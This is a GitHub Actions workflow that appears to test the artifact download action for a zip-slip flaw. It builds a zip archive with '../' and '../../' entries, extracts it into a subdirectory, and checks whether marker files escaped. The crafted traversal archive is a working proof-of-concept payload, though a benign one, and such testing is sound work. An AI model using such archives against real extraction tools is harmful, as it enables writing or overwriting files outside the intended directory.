name: Zip Slip Test
on:
  workflow_dispatch:

jobs:
  upload-crafted:
    runs-on: ubuntu-latest
    steps:
      - name: Create zip with traversal entry
        run: |
          # Create a zip with a path traversal entry using Python
          python3 -c "
          import zipfile, io, os
          # Create zip in memory with traversal entry
          zip_path = '/tmp/crafted.zip'
          with zipfile.ZipFile(zip_path, 'w') as zf:
              # Normal entry
              zf.writestr('normal.txt', 'This is inside the target dir')
              # Traversal entry - goes one level up
              zf.writestr('../zipslip-proof.txt', 'ZIP_SLIP_CONFIRMED')
              # Deeper traversal
              zf.writestr('../../zipslip-deep.txt', 'ZIP_SLIP_DEEP')
          print('Crafted zip created')
          # List entries
          with zipfile.ZipFile(zip_path, 'r') as zf:
              for info in zf.infolist():
                  print(f'  Entry: {info.filename} ({info.file_size} bytes)')
          "

      - name: Upload crafted zip as artifact
        uses: actions/upload-artifact@v4
        with:
          name: crafted-artifact
          path: /tmp/crafted.zip

  download-test:
    needs: upload-crafted
    runs-on: ubuntu-latest
    steps:
      - name: Create target directory
        run: |
          mkdir -p /tmp/extract-target/subdir
          echo "Target dir: /tmp/extract-target/subdir"
          ls -la /tmp/extract-target/

      - name: Download artifact
        uses: actions/download-artifact@v4
        with:
          name: crafted-artifact
          path: /tmp/extract-target/subdir

      - name: Check for zip slip
        run: |
          echo "=== Contents of target dir ==="
          find /tmp/extract-target -type f -ls 2>/dev/null
          echo ""
          echo "=== Check for traversal files ==="
          if [ -f "/tmp/extract-target/zipslip-proof.txt" ]; then
            echo "ZIP SLIP CONFIRMED: file escaped to parent dir!"
            cat /tmp/extract-target/zipslip-proof.txt
          else
            echo "No zip slip (file not in parent)"
          fi
          echo ""
          if [ -f "/tmp/zipslip-deep.txt" ]; then
            echo "DEEP ZIP SLIP CONFIRMED: file escaped two levels!"
            cat /tmp/zipslip-deep.txt
          else
            echo "No deep zip slip"
          fi
          echo ""
          echo "=== Check target subdir contents ==="
          ls -la /tmp/extract-target/subdir/ 2>/dev/null || echo "subdir empty"
